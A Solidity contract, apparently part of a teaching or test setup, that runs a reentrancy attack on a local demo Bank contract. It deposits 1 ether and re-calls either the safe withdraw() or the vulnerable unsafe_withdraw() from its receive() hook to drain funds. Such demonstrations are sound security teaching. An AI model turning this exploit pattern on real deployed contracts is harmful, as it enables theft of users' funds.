// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../v8/Bank.sol";

contract ReentrancyAttacker {
    Bank public bank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    bool public attackSafe; // Flag to control which function to attack

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    /**
     * @notice Launch reentrancy attack
     * @param _attackSafe If true, attack safe withdraw(); if false, attack unsafe_withdraw()
     */
    function attack(bool _attackSafe) external payable {
        require(msg.value == ATTACK_AMOUNT);

        attackSafe = _attackSafe; // Set the flag

        // Deposit funds
        bank.deposit{ value: ATTACK_AMOUNT }();

        // Start the attack based on flag
        if (attackSafe) {
            bank.withdraw(ATTACK_AMOUNT); // Attack safe function
        } else {
            bank.unsafe_withdraw(ATTACK_AMOUNT); // Attack vulnerable function
        }
    }

    receive() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT) {
            // Continue attack based on flag
            if (attackSafe) {
                bank.withdraw(ATTACK_AMOUNT);
            } else {
                bank.unsafe_withdraw(ATTACK_AMOUNT);
            }
        }
    }
}
